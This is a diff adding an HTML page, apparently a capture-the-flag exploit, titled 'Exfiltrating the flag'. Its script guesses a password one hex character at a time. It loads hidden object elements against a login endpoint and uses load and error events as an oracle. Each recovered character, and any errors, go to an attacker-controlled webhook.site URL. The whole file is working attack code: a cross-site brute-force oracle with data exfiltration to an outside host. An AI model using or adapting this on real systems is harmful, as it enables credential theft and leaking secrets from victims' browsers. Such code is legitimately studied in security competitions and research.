@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8" />
+    <title>Redirecting</title>
+  </head>
+  <body>
+    <h1>Exfiltrating the flag</h1>
+    <script>
+      (async () => {
+        const sleep = ms => new Promise(r => setTimeout(r, ms));
+        try {
+            // List of characters to try (hex)
+            const hexChars = '0123456789abcdef'; // Also try 'abcdef' if needed
+            // const hexChars = '0123456789abcdefABCDEF'; // Use this if case-sensitive
+
+            let foundPassword = 'replicanx'; // This will store the password we are building
+            const maxLength = 16;   // Set a maximum length to prevent infinite loop
+
+            async function bruteForcePassword() {
+            // Outer loop: for each position in the password
+            for (let pos = 0; pos < maxLength; pos++) {
+                let foundChar = null;
+
+                // Inner loop: try each possible character for the current position
+                for (const char of hexChars) {
+                    const currentGuess = foundPassword + char;
+                    console.log(`Trying: ${currentGuess}`);
+
+                    // Try the current guess and wait for the result
+                    const result = await tryPassword(currentGuess);
+
+                    if (result.status === 'success') {
+                        // If success, we found the correct character for this position
+                        console.log(`✅ Found character ${pos+1}: ${char}`);
+                        foundChar = char;
+                        foundPassword = currentGuess; // Update the found password
+                        fetch("https://webhook.site/ed3db625-aacb-48af-8ea1-7d72881fb7b1/?data=success&payload=" + currentGuess)
+                        break; // Break out of the inner loop and move to the next position
+                    }
+                    // If not success, continue to the next character
+                    }
+
+                    if (foundChar === null) {
+                    // If no character was found for this position, we might be done
+                    console.log(`❌ No valid character found for position ${pos+1}. Assuming password is complete.`);
+                    break;
+                }
+            }
+
+            console.log(`🎉 Password found: ${foundPassword}`);
+            }
+
+            // The function that returns a Promise for a single password attempt
+            function tryPassword(password) {
+            return new Promise((resolve) => {
+                const obj = document.createElement('object');
+                // Build the target URL with the current guess
+                obj.data = `http://research.r3plican.dev:1336/api/login?username=rxgty&password=${password}`;
+                obj.type = "text/html";
+                obj.width = "1";
+                obj.height = "1";
+                obj.style.visibility = "hidden";
+
+                // Set a timeout to clean up and resolve in case the request hangs
+                const timeoutId = setTimeout(() => {
+                    resolve({ password, status: 'timeout' });
+                    if (obj.parentNode) obj.remove();
+                }, 3000); // Adjust timeout as needed (e.g., 3000ms = 3 seconds)
+
+                obj.onload = () => {
+                    clearTimeout(timeoutId);
+                    resolve({ password, status: 'success' });
+                    if (obj.parentNode) obj.remove();
+                };
+                obj.onerror = () => {
+                    clearTimeout(timeoutId);
+                    resolve({ password, status: 'error' });
+                    if (obj.parentNode) obj.remove();
+                };
+
+                document.body.appendChild(obj);
+            });
+            }
+
+            // Start the brute-force attack
+            bruteForcePassword();
+        }
+        catch (error) {
+            if (error instanceof DOMException && error.name === "SecurityError") {
+                fetch("https://webhook.site/ed3db625-aacb-48af-8ea1-7d72881fb7b1/?data=blocked")
+            }
+            else {
+                fetch("https://webhook.site/ed3db625-aacb-48af-8ea1-7d72881fb7b1/?data=something_else" + btoa(error))
+            }
+        }
+      })()
+    </script>
+  </body>
+</html>
